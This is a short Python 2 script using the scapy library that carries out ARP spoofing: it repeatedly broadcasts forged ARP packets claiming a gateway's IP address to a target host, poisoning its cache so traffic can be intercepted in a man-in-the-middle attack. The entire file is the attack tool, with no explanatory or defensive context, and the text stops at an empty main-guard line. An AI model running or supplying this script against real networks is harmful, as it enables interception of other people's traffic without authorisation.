#!/usr/bin/python
#coding:utf-8
import sys,time
from scapy.all import * 
def arpsoof(ip1,ip2):                #ip2:getway  , ip1 who tricker
    try:
        pkt=(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip1,psrc=ip2))
        sendp(pkt)
        return
    except:
        return
def main():
    if len(sys.argv)!=3:
        print"please ./xx.py ip and ip"
        sys.exit()

    ip1=str(sys.argv[1]).strip()
    ip2=str(sys.argv[2]).strip()
    while True:
        try:
            arpsoof(ip1,ip2)
            time.sleep(0.5)
        except KeyboardInterrupt:
            print
            break
if __name__ == "__main__":
